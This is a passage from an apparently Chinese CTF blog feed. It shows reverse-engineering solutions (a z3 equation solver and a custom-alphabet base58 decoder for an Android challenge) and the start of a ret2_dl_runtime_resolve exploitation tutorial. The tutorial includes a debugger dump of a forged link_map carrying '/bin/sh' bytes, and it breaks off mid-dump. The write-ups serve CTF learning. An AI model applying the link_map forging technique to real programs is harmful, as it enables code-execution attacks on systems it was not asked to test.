class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx = Context()</span><br><span class="line"></span><br><span class="line">l = [Int(<span class="string">f&quot;l<span class="subst">&#123;i&#125;</span>&quot;</span>, ctx=ctx) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>)]</span><br><span class="line"></span><br><span class="line">eq1 = (<span class="number">593</span>*l[<span class="number">0</span>] + <span class="number">997</span>*l[<span class="number">1</span>] + <span class="number">811</span>*l[<span class="number">2</span>] + <span class="number">258</span>*l[<span class="number">3</span>] + <span class="number">829</span>*l[<span class="number">4</span>] + <span class="number">532</span>*l[<span class="number">5</span>]) == <span class="number">0x5b8e0aef71d34ff43</span></span><br><span class="line">eq2 = (<span class="number">605</span>*l[<span class="number">0</span>] + <span class="number">686</span>*l[<span class="number">1</span>] + <span class="number">328</span>*l[<span class="number">2</span>] + <span class="number">602</span>*l[<span class="number">3</span>] + <span class="number">695</span>*l[<span class="number">4</span>] + <span class="number">576</span>*l[<span class="number">5</span>]) == <span class="number">0x551a262360964ef7f</span></span><br><span class="line">eq3 = (<span class="number">373</span>*l[<span class="number">0</span>] + <span class="number">512</span>*l[<span class="number">1</span>] + <span class="number">449</span>*l[<span class="number">2</span>] + <span class="number">756</span>*l[<span class="number">3</span>] + <span class="number">448</span>*l[<span class="number">4</span>] + <span class="number">580</span>*l[<span class="number">5</span>]) == <span class="number">0x49d158a5657d6931c</span></span><br><span class="line">eq4 = (<span class="number">560</span>*l[<span class="number">0</span>] + <span class="number">635</span>*l[<span class="number">1</span>] + <span class="number">422</span>*l[<span class="number">2</span>] + <span class="number">971</span>*l[<span class="number">3</span>] + <span class="number">855</span>*l[<span class="number">4</span>] + <span class="number">597</span>*l[<span class="number">5</span>]) == <span class="number">0x625568d5abbabf4f3</span></span><br><span class="line">eq5 = (<span class="number">717</span>*l[<span class="number">0</span>] + <span class="number">507</span>*l[<span class="number">1</span>] + <span class="number">388</span>*l[<span class="number">2</span>] + <span class="number">925</span>*l[<span class="number">3</span>] + <span class="number">324</span>*l[<span class="number">4</span>] + <span class="number">524</span>*l[<span class="number">5</span>]) == <span class="number">0x50ee0c025e70e3c23</span></span><br><span class="line">eq6 = (<span class="number">312</span>*l[<span class="number">0</span>] + <span class="number">368</span>*l[<span class="number">1</span>] + <span class="number">884</span>*l[<span class="number">2</span>] + <span class="number">518</span>*l[<span class="number">3</span>] + <span class="number">495</span>*l[<span class="number">4</span>] + <span class="number">414</span>*l[<span class="number">5</span>]) == <span class="number">0x40e735f8aa2815f65</span></span><br><span class="line"></span><br><span class="line">solver = Solver(ctx=ctx)</span><br><span class="line"></span><br><span class="line">solver.add(eq1, eq2, eq3, eq4, eq5, eq6)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line"></span><br><span class="line">    model = solver.model()</span><br><span class="line">    <span class="built_in">print</span>(model)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;l<span class="subst">&#123;i&#125;</span> = <span class="subst">&#123;model[l[i]]&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;无解&quot;</span>)</span><br><span class="line">l_values = [</span><br><span class="line">    <span class="number">28829613228248624</span>,</span><br><span class="line">    <span class="number">26827458353261422</span>,</span><br><span class="line">    <span class="number">13642136288051316</span>,</span><br><span class="line">    <span class="number">29378135513658469</span>,</span><br><span class="line">    <span class="number">32192963475959391</span>,</span><br><span class="line">    <span class="number">30791965425607037</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> val <span class="keyword">in</span> l_values:</span><br><span class="line">    <span class="keyword">while</span> val &gt; <span class="number">0</span>:</span><br><span class="line">        byte = val &amp; <span class="number">0xFF</span>  <span class="comment"># 取最低8位</span></span><br><span class="line">        result = <span class="built_in">chr</span>(byte) + result  </span><br><span class="line">        val &gt;&gt;= <span class="number">8</span>  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result =result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">l_values = [</span><br><span class="line">    <span class="number">28829613228248624</span>,</span><br><span class="line">    <span class="number">26827458353261422</span>,</span><br><span class="line">    <span class="number">13642136288051316</span>,</span><br><span class="line">    <span class="number">29378135513658469</span>,</span><br><span class="line">    <span class="number">32192963475959391</span>,</span><br><span class="line">    <span class="number">30791965425607037</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">char_lists = []</span><br><span class="line"><span class="keyword">for</span> val <span class="keyword">in</span> l_values:</span><br><span class="line">    char_list = []</span><br><span class="line">    <span class="keyword">while</span> val &gt; <span class="number">0</span>:</span><br><span class="line">        byte = val &amp; <span class="number">0xFF</span></span><br><span class="line">        char_list.insert(<span class="number">0</span>, <span class="built_in">chr</span>(byte)) </span><br><span class="line">        val &gt;&gt;= <span class="number">8</span></span><br><span class="line">    char_lists.append(char_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sorted_char_lists = <span class="built_in">sorted</span>(<span class="built_in">enumerate</span>(char_lists), key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join(char_list) <span class="keyword">for</span> _, char_list <span class="keyword">in</span> sorted_char_lists])</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ezzzapk-xxxx附件名"><a href="#ezzzapk-xxxx附件名" class="headerlink" title="ezzzapk xxxx附件名"></a>ezzzapk xxxx附件名</h3><p>此题用jeb 去看伪代码，伪代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Override</span>  <span class="comment">// androidx.fragment.app.FragmentActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F0B001C</span>);  <span class="comment">// layout:activity_main</span></span><br><span class="line">        <span class="built_in">this</span>.flag = (TextView)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0800C0</span>);  <span class="comment">// id:flag</span></span><br><span class="line">        <span class="built_in">this</span>.input_1 = (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0800DF</span>);  <span class="comment">// id:input_1</span></span><br><span class="line">        <span class="type">Button</span> <span class="variable">v1</span> <span class="operator">=</span> (Button)<span class="built_in">this</span>.findViewById(<span class="number">0x7F080062</span>);  <span class="comment">// id:button</span></span><br><span class="line">        <span class="built_in">this</span>.button = v1;</span><br><span class="line">        v1.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span>  <span class="comment">// android.view.View$OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> encrypt.encode(MainActivity.<span class="built_in">this</span>.input_1.getText().toString().getBytes(StandardCharsets.UTF_8));</span><br><span class="line">                <span class="keyword">if</span>(<span class="string">&quot;5TAYhycAPT1aAd535TGdWYQ8CvfoRjErGEreqhDpqv1LydTqd3mxuK2hhUp9Pws3u9mq6eX&quot;</span>.equals(str3)) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplication(), <span class="string">&quot;flag正确&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplication(), <span class="string">&quot;flag错误，再去撅一会&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>encrypt.encode：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> cn.shenghuo2.ctf.ez_apk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">encrypt</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">char</span>[] ALPHABET;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">char</span> ENCODED_ZERO;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span>[] INDEXES;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] v0 = <span class="string">&quot;9LfnoVpi1HrzBSKxhNFeyY745R2g3QmqsTCZJuDvcMdkE8wPGbUXajtAW6&quot;</span>.toCharArray();</span><br><span class="line">        encrypt.ALPHABET = v0;</span><br><span class="line">        encrypt.ENCODED_ZERO = v0[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span>[] v0_1 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0x80</span>];</span><br><span class="line">        encrypt.INDEXES = v0_1;</span><br><span class="line">        Arrays.fill(v0_1, -<span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; <span class="literal">true</span>; ++i) &#123;</span><br><span class="line">            <span class="type">char</span>[] v1 = encrypt.ALPHABET;</span><br><span class="line">            <span class="keyword">if</span>(i &gt;= v1.length) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            encrypt.INDEXES[v1[i]] = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span> <span class="title function_">divmod</span><span class="params">(<span class="type">byte</span>[] arg5, <span class="type">int</span> arg6, <span class="type">int</span> arg7, <span class="type">int</span> arg8)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">remainder</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = arg6; i &lt; arg5.length; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> remainder * arg7 + (arg5[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line">            arg5[i] = (<span class="type">byte</span>)(temp / arg8);</span><br><span class="line">            remainder = temp % arg8;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (<span class="type">byte</span>)remainder;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encode</span><span class="params">(<span class="type">byte</span>[] arg7)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(arg7.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> zeros;</span><br><span class="line">        <span class="keyword">for</span>(zeros = <span class="number">0</span>; zeros &lt; arg7.length &amp;&amp; arg7[zeros] == <span class="number">0</span>; ++zeros) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] v7 = Arrays.copyOf(arg7, arg7.length);</span><br><span class="line">        <span class="type">char</span>[] encoded = <span class="keyword">new</span> <span class="title class_">char</span>[v7.length * <span class="number">2</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">outputStart</span> <span class="operator">=</span> encoded.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">inputStart</span> <span class="operator">=</span> zeros;</span><br><span class="line">        <span class="keyword">while</span>(inputStart &lt; v7.length) &#123;</span><br><span class="line">            --outputStart;</span><br><span class="line">            encoded[outputStart] = encrypt.ALPHABET[encrypt.divmod(v7, inputStart, <span class="number">0x100</span>, <span class="number">58</span>)];</span><br><span class="line">            <span class="keyword">if</span>(v7[inputStart] != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ++inputStart;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(outputStart &lt; encoded.length &amp;&amp; encoded[outputStart] == encrypt.ENCODED_ZERO) &#123;</span><br><span class="line">            ++outputStart;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            --zeros;</span><br><span class="line">            <span class="keyword">if</span>(zeros &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            --outputStart;</span><br><span class="line">            encoded[outputStart] = encrypt.ENCODED_ZERO;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(encoded, outputStart, encoded.length - outputStart);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析一下伪代码，发现就是一个base58，只不过换表了，跟base64换码(biao)一个道理，直接写脚本换下即可</p><p>exp.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">BASE58_ALPHABET = <span class="string">&quot;9LfnoVpi1HrzBSKxhNFeyY745R2g3QmqsTCZJuDvcMdkE8wPGbUXajtAW6&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base58_decode</span>(<span class="params">cipher_input</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#  检查密文字符的有效性，密文字符必须是base58中的字符，否则返回提示</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> cipher_input:</span><br><span class="line">            <span class="keyword">if</span> item <span class="keyword">not</span> <span class="keyword">in</span> BASE58_ALPHABET:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;不是有效的Base58编码，请仔细检查字符：&#x27;</span> + item</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将Base58编码的字符转换为Base10数字</span></span><br><span class="line">        decoded_value = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> cipher_input:</span><br><span class="line">            decoded_value = decoded_value * <span class="number">58</span> + BASE58_ALPHABET.index(char)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将Base10数字转换为字节串</span></span><br><span class="line">        result = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">while</span> decoded_value &gt; <span class="number">0</span>:</span><br><span class="line">            decoded_value, remainder = <span class="built_in">divmod</span>(decoded_value, <span class="number">256</span>)</span><br><span class="line">            result.insert(<span class="number">0</span>, remainder)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base58_encode</span>(<span class="params">string_input</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 将字符串转换为字节串</span></span><br><span class="line">        string_bytes = string_input.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将字节串转换为Base10数字</span></span><br><span class="line">        string_decimal = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> byte <span class="keyword">in</span> string_bytes:</span><br><span class="line">            string_decimal = string_decimal * <span class="number">256</span> + byte</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将Base10数字转换为Base58编码的字符串</span></span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> string_decimal &gt; <span class="number">0</span>:</span><br><span class="line">            string_decimal, remainder = <span class="built_in">divmod</span>(string_decimal, <span class="number">58</span>)</span><br><span class="line">            result = BASE58_ALPHABET[remainder] + result</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试解码</span></span><br><span class="line">encoded_str = <span class="string">&quot;5TAYhycAPT1aAd535TGdWYQ8CvfoRjErGEreqhDpqv1LydTqd3mxuK2hhUp9Pws3u9mq6eX&quot;</span></span><br><span class="line">decoded_str = base58_decode(encoded_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decoded String:&quot;</span>, decoded_str)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>总结：啥也没有，就是很开摆…………..,以后就不常写文章了，毕竟要准备考试www</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;关于xxxx比赛xxx学弟xxxx时间给了xxxx两个道re题，👴开了下题不难，就是写脚本老是报错，g&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这两天学弟给了两道Rev题，重温下当年的re味道，re都不难，随便水一个博客文章（毕竟博客刚创建没多久，</summary>
      
    
    
    
    <category term="Reverse" scheme="https://jsjsj.top/categories/Reverse/"/>
    
    
    <category term="Reverse" scheme="https://jsjsj.top/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>ret2_dl_runtime_resolve</title>
    <link href="https://jsjsj.top/2023/10/03/ret2-dl-runtime-resolve/"/>
    <id>https://jsjsj.top/2023/10/03/ret2-dl-runtime-resolve/</id>
    <published>2023-10-03T14:07:17.000Z</published>
    <updated>2023-10-03T14:30:34.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ret2-dl-runtime-resolve-x86-x64"><a href="#ret2-dl-runtime-resolve-x86-x64" class="headerlink" title="ret2_dl_runtime_resolve(x86&#x2F;x64)"></a>ret2_dl_runtime_resolve(x86&#x2F;x64)</h1><h2 id="First-record-the-method-link-map-of-ret2-dl-runtime-resolve-of-x64"><a href="#First-record-the-method-link-map-of-ret2-dl-runtime-resolve-of-x64" class="headerlink" title="First record the method link_map of ret2_dl_runtime_resolve of x64"></a>First record the method link_map of ret2_dl_runtime_resolve of x64</h2><p>I think ret2dl is very difficult, very difficult, really difficult, woo woo<br>link_map I think it is like the iofile on the stack, that is, link_map. Let’s analyze the source code.</p><p>Before analyzing the previous source code, let’s look at a few structures:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Elf32_Rel：</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addrr_offset;<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Wordr_info;<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line">Elf64_Rel：</span><br><span class="line"><span class="keyword">typedef</span> structc</span><br><span class="line">&#123;</span><br><span class="line">  Elf64_Addrr_offset;<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xwordr_info;<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf64_Rel;</span><br></pre></td></tr></table></figure><p>The above is the relocation function structure,</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Wordst_name;<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addrst_value;<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Wordst_size;<span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>st_info;<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>st_other;<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Sectionst_shndx;<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span>c</span><br><span class="line">  Elf64_Wordst_name;<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>st_info;<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Sectionst_shndx;<span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addrst_value;<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xwordst_size;<span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure><p>The above is the symtable structure, which is precisely located by the r_info of the previous relocation function structure</p><p>In fact, these can be faked in linkmap, let’s look at the structure of linkmap</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *l</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  l_addr = <span class="number">18446744073708782128</span>,</span><br><span class="line">  l_name = <span class="number">0x0</span>,</span><br><span class="line">  l_ld = <span class="number">0x601168</span>,</span><br><span class="line">  l_next = <span class="number">0x6bcf50</span>,</span><br><span class="line">  l_prev = <span class="number">0x7</span>,</span><br><span class="line">  l_real = <span class="number">0x0</span>,</span><br><span class="line">  l_ns = <span class="number">0</span>,</span><br><span class="line">  l_libname = <span class="number">0x0</span>,</span><br><span class="line">  l_info = &#123;<span class="number">0x601010</span>, <span class="number">0x68732f6e69622f</span>, <span class="number">0x4141414141414141</span>, <span class="number">0x4141414141414141</span>, <span class="number">0x4141414141414141</span>, <span class="number">0x601150</span>, <span class="number">0x601188</span>, <span class="number">0x4141414141414141</span> &lt;repeats <span class="number">16</span> times&gt;, <span class="number">0x601158</span>, <span class="number">0x0</span> &lt;repeats <span class="number">53</span> times&gt;&#125;,</span><br><span class="line">  l_phdr = <span class="number">0x0</span>,</span><br><span class="line">  l_entry = <span class="number">0</span>,</span><br><span class="line">  l_phnum = <span class="number">0</span>,</span><br><span class="line">  l_ldnum = <span class="number">0</span>,</span><br><span class="line">  